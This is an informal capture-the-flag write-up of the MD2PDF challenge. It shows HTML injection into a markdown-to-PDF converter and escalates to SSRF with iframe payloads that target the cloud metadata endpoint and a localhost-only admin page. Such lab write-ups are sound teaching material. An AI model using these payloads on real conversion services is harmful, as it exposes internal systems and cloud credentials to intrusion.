```Description 
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

_Note: Please allow 3-5 minutes for the VM to boot up fully before attempting the challenge._
```

```IP-Addresss 
10.10.32.147
```
#SSRF_MD2PDF
when I got the IP_Address then i surf on it and i found an page which convert the text into pdf which can be downloaded as a pdf while there is open space for input which I believe is vulnerable to any recent or precious issue then i jump on source code of the website where i found 
```Source_Code_Snippet 
  <script>
    $(document).ready(function () {
      var editor = CodeMirror.fromTextArea(document.getElementById("md"), {
        mode: "markdown",
        lineNumbers: true,
        tabSize: 2,
        lineWrapping: true,
      })
      $("#convert").click(function () {
        const data = new FormData()
        data.append("md", editor.getValue())
        $("#progress").show()

        fetch("/convert", {
          method: "POST",
          body: data,
        })
          .then((response) => response.blob())
          .then((data) => window.open(URL.createObjectURL(data)))
          .catch((error) => {
            $("#progress").hide()
            console.log(error)
          })
      })
    })
```
which is vulnerable to XSS vulnerability which can be check using the script or text type in input section and proceed 
```Input 
<script>alert(1)</script>
```
I just use this injection to check if it is vulnerable or not then i found out that its neither create any alert or pop but its nor on the pdf document, so this confirm the vulnerability 
and then I deep down more 
and find out that the 
```input 
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```
this command also working and render image in pdf section which gives us hint of SSRF
```input 
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```
which gives us output 
```ami-id  
ami-launch-index  
ami-manifest-path  
block-device-mapping/  
events/  
hostname  
identity-credentials/  
instance-action  
instance-id  
instance-life-cycle  
```
then we found out about = admin using Gobuster 
but cant access on browser its shows it can only access using "localhost" 
```Input 
<iframe src="http://localhost:5000/admin" style="width:1000px;height:800px;"></iframe>
```
this shows the flag and its shows the input that i want to accessing the admin locally from server and its SSRF vulnerability 
``` Flag
[flag omitted]
```